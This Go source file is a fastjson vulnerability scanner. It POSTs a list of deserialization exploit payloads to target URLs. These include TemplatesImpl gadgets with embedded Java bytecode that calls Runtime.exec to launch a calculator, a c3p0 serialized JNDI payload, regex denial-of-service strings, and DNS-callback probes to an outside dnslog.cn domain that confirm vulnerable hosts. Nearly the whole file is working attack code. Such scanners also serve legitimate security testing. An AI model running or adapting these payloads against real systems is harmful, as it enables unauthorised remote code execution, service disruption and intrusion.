package src

import (
	"bufio"
	"bytes"
	"crypto/md5"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
)

func Scan(Info *ScanInfo) {

	if Info.Url == "" && Info.UrlFile  == ""{
		fmt.Println("Host is none")
		flag.Usage()
		os.Exit(0)
	}
	if Info.Url != ""{
		results := VerifyUrl(Info.Url)
		if results == true{
			Info.ScanUrl  = append(Info.ScanUrl,Info.Url)
		}
	}
	if Info.UrlFile !="" {
		fi, err := os.Open(Info.UrlFile)
		if err != nil {
			fmt.Printf("Error: %s\n", err)
			return
		}
		defer fi.Close()

		br := bufio.NewReader(fi)
		for {
			url, _, error := br.ReadLine()
			if error == io.EOF {
				break
			}
			results := VerifyUrl(string(url))
			if results == true{
				Info.ScanUrl  = append(Info.ScanUrl,string(url))
			}
		}
	}
	GetDomain(Info)
	race(Info)
}


//Get Dnslog Domain
func GetDomain(Info *ScanInfo){
	url := "http://dnslog.cn/getdomain.php"
	req, err := http.NewRequest("Get", url,nil)
	req.Header.Set("User-agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9")
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("dnslog.cn 访问失败")
		return
	}
	defer resp.Body.Close()
	cookie := resp.Header["Set-Cookie"]
	domain, _ := ioutil.ReadAll(resp.Body)
	Info.DnslogDomain = string(domain)
	Info.DnslogCookie = cookie[0]
}

//Verify url
func VerifyUrl (Url  string )(bool){
	urlRegex := "^(https?://)[-a-zA-Z0-9+&@#/%?=~_|!:,.;]*[-a-zA-Z0-9+&@#/%=~_|]"
	match, err := regexp.MatchString(urlRegex, Url)
	if err !=nil{
		return false
	}
	return match

}


func race(Info *ScanInfo){

	results := make(chan string)
	scanUrl := make(chan string)
	ws := len(Info.ScanUrl)
	wg := make(chan bool)
	for i:=0;i< len(Info.ScanUrl);i++{
		go WebRequest(scanUrl,results,Info,wg)

	}
	go func() {
		for i:=0;i<len(Info.ScanUrl);i++{
			scanUrl<-Info.ScanUrl[i]
		}
	}()

	for {
			select {
			case msg:=<-results:
				fmt.Printf("[+] %s 存在fastjson\n",msg)
			case <-wg:
				ws--
				if ws==0 {
					return
				}
			}

	}
}

func WebRequest(Url,results chan string,Info *ScanInfo,wg chan bool){

	for Url:= range Url{
		md5str1 := UrlMd5(Url)
		var Playload = []string{
			"{\"@type\":\"java.lang.AutoCloseable\"",
			"{\"rand10\":{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARBYUFhAQAMSW5uZXJDbGFzc2VzAQAdTGNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMkQWFBYTsBAApTb3VyY2VGaWxlAQAKVGVzdDMuamF2YQwABAAFBwATAQAbY29tL2xvbmdvZm8vdGVzdC9UZXN0MyRBYUFhAQAQamF2YS9sYW5nL09iamVjdAEAFmNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAVAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAFwAYCgAWABkBAARjYWxjCAAbAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAHQAeCgAWAB8BABNBYUFhNzQ3MTA3MjUwMjU3NTQyAQAVTEFhQWE3NDcxMDcyNTAyNTc1NDI7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAAHAAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ\"],\"_name\":\"aaa\",\"_tfactory\":{},\"_outputProperties\":{}}}\n",
			"{\"rand11\":{\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\"userOverridesAsString\":\"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383038302f740003466f6f;\"}}\n",
			"{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADEAJAoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtTdGF0aWNCbG9jawEADElubmVyQ2xhc3NlcwEAEUxFeHAkU3RhdGljQmxvY2s7AQAKU291cmNlRmlsZQEACEV4cC5qYXZhDAAEAAUHABMBAA9FeHAkU3RhdGljQmxvY2sBABBqYXZhL2xhbmcvT2JqZWN0AQADRXhwAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFAoAFQAPAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAGAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMABoAGwoAGQAcAQAob3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAgAHgEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMACAAIQoAGQAiACEAAgAVAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ABaxAAAAAgAHAAAABgABAAAABwAIAAAADAABAAAABQAJAAwAAAAIABcABQABAAYAAAAWAAIAAAAAAAq4AB0SH7YAI1exAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ\"],\"_name\":\"c\",\"_tfactory\":{},\"outputProperties\":{}}\n",
			"{\"@type\":\"Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\",\"_bytecodes\":[\"yv66vgAAADEAJAoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtTdGF0aWNCbG9jawEADElubmVyQ2xhc3NlcwEAEUxFeHAkU3RhdGljQmxvY2s7AQAKU291cmNlRmlsZQEACEV4cC5qYXZhDAAEAAUHABMBAA9FeHAkU3RhdGljQmxvY2sBABBqYXZhL2xhbmcvT2JqZWN0AQADRXhwAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFAoAFQAPAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAGAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMABoAGwoAGQAcAQAob3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAgAHgEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMACAAIQoAGQAiACEAAgAVAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ABaxAAAAAgAHAAAABgABAAAABwAIAAAADAABAAAABQAJAAwAAAAIABcABQABAAYAAAAWAAIAAAAAAAq4AB0SH7YAI1exAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ\"],\"_name\":\"c\",\"_tfactory\":{},\"outputProperties\":{}\n",
			"{\\\"@type\\\":\\\"LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;\\\",\\\"_bytecodes\\\":[\\\"yv66vgAAADEAJAoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtTdGF0aWNCbG9jawEADElubmVyQ2xhc3NlcwEAEUxFeHAkU3RhdGljQmxvY2s7AQAKU291cmNlRmlsZQEACEV4cC5qYXZhDAAEAAUHABMBAA9FeHAkU3RhdGljQmxvY2sBABBqYXZhL2xhbmcvT2JqZWN0AQADRXhwAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFAoAFQAPAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAGAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMABoAGwoAGQAcAQAob3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAgAHgEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMACAAIQoAGQAiACEAAgAVAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ABaxAAAAAgAHAAAABgABAAAABwAIAAAADAABAAAABQAJAAwAAAAIABcABQABAAYAAAAWAAIAAAAAAAq4AB0SH7YAI1exAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ\\\"],\\\"_name\\\":\\\"c\\\",\\\"_tfactory\\\":{},\\\"outputProperties\\\":{}}\n",
			"{\\\"@type\\\":\\\"[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\"[{,\\\"_bytecodes\\\":[\\\"yv66vgAAADEAJAoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtTdGF0aWNCbG9jawEADElubmVyQ2xhc3NlcwEAEUxFeHAkU3RhdGljQmxvY2s7AQAKU291cmNlRmlsZQEACEV4cC5qYXZhDAAEAAUHABMBAA9FeHAkU3RhdGljQmxvY2sBABBqYXZhL2xhbmcvT2JqZWN0AQADRXhwAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFAoAFQAPAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAGAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMABoAGwoAGQAcAQAob3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAgAHgEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMACAAIQoAGQAiACEAAgAVAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ABaxAAAAAgAHAAAABgABAAAABwAIAAAADAABAAAABQAJAAwAAAAIABcABQABAAYAAAAWAAIAAAAAAAq4AB0SH7YAI1exAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ\\\"],\\\"_name\\\":\\\"c\\\",\\\"_tfactory\\\":{},\\\"outputProperties\\\":{}}\n",
			"{\"1\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"},\"2\":{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADEAJAoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtTdGF0aWNCbG9jawEADElubmVyQ2xhc3NlcwEAEUxFeHAkU3RhdGljQmxvY2s7AQAKU291cmNlRmlsZQEACEV4cC5qYXZhDAAEAAUHABMBAA9FeHAkU3RhdGljQmxvY2sBABBqYXZhL2xhbmcvT2JqZWN0AQADRXhwAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFAoAFQAPAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAGAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMABoAGwoAGQAcAQAob3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAgAHgEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMACAAIQoAGQAiACEAAgAVAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ABaxAAAAAgAHAAAABgABAAAABwAIAAAADAABAAAABQAJAAwAAAAIABcABQABAAYAAAAWAAIAAAAAAAq4AB0SH7YAI1exAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ\"],\"_name\":\"c\",\"_tfactory\":{},\"outputProperties\":{}}}",
			"{\"regex\":{\"$ref\":\"$[poc rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']\"},\"poc\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!\"}",
			"{\"regex\":{\"$ref\":\"$[\\poc = /\\^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$/]\"},\"poc\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!\"}",
			"{\"rand1\":{\"@type\":\"java.net.InetAddress\",\"val\":\""+md5str1+"."+Info.DnslogDomain+"\"}}",
			"{\"rand2\":{\"@type\":\"java.net.Inet4Address\",\"val\":\""+md5str1+"."+Info.DnslogDomain+"\"}}",
			"{\"rand3\":{\"@type\":\"java.net.Inet6Address\",\"val\":\""+md5str1+"."+Info.DnslogDomain+"\"}}",
			"{\"rand4\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\""+md5str1+"."+Info.DnslogDomain+"\"}}}",
			"{\"rand5\":{\"@type\":\"java.net.URL\",\"val\":\""+md5str1+"."+Info.DnslogDomain+"\"}}",
			"{\"rand6\":{\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\""+md5str1+"."+Info.DnslogDomain+"\"}}\"\"}}",
			"{\"rand7\":Set[{\"@type\":\"java.net.URL\",\"val\":\""+md5str1+"."+Info.DnslogDomain+"\"}]}",
			"{\"rand8\":Set[{\"@type\":\"java.net.URL\",\"val\":\""+md5str1+"."+Info.DnslogDomain+"\"}",
			"{\"rand9\":{\"@type\":\"java.net.URL\",\"val\":\""+md5str1+"."+Info.DnslogDomain+"\"}:0",
		}
		fmt.Printf("[...]%s 扫描中\n",Url)
		//http Request
		if strings.Contains(Url,"http://")==true{
			for i := 0; i < len(Playload); i++ {
				var jsonStr = []byte(Playload[i])
				req, err := http.NewRequest("POST", Url, bytes.NewBuffer(jsonStr))
				// req.Header.Set("X-Custom-Header", "myvalue")
				req.Header.Set("User-agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36")
				req.Header.Set("Accept", "*/*")
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9")
				client := &http.Client{}
				resp, err := client.Do(req)
				if err != nil {
					wg <- true
					return
				}
				defer resp.Body.Close()
				body, _ := ioutil.ReadAll(resp.Body)
				if strings.Contains(string(body), "fastjson") == true && resp.StatusCode!=200 || strings.Contains(string(body), "alibaba") == true && resp.StatusCode!=200 {
					results <- Url
					wg <- true
					return
				}
			}
			GetRecords(Info.DnslogCookie,md5str1,Url,results)
			wg <- true
			return
		}

		//https Request
		if strings.Contains(Url,"https://") {
			timeout := time.Duration(1000 * time.Second) //time out
			client  := &http.Client{
				Timeout: timeout,
				Transport: &http.Transport{
					TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
				},
			}

			for i := 0; i < len(Playload); i++ {

				var jsonStr = []byte(Playload[i])
				req, err := http.NewRequest("POST", Url, bytes.NewBuffer(jsonStr))
				req.Header.Set("User-agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36")
				req.Header.Set("Accept", "*/*")
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9")
				resp, err := client.Do(req)
				if err != nil {
					wg <- true
					return
				}
				defer resp.Body.Close()
				body, _ := ioutil.ReadAll(resp.Body)
				if strings.Contains(string(body), "fastjson") == true && resp.StatusCode!=200 || strings.Contains(string(body), "alibaba") == true && resp.StatusCode!=200 {
					results <- Url
					wg <- true
					return
				}
			}
			GetRecords(Info.DnslogCookie,md5str1,Url,results)
			wg <- true
			return
		}
	}
	return
}

func GetRecords(cookie,md5,scanurl string,results chan string)  {
	time.Sleep(time.Duration(3)*time.Second)
	url := "http://dnslog.cn/getrecords.php"
	req, err := http.NewRequest("Get", url,nil)
	// req.Header.Set("X-Custom-Header", "myvalue")
	req.Header.Set("User-agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Cookie", cookie)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9")
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	if strings.Contains(string(body),md5)==true {
		results <- scanurl
	}
	return
}

func UrlMd5(url string) (md5s string){
	data := []byte(url)
	has := md5.Sum(data)
	return fmt.Sprintf("%x", has)
}



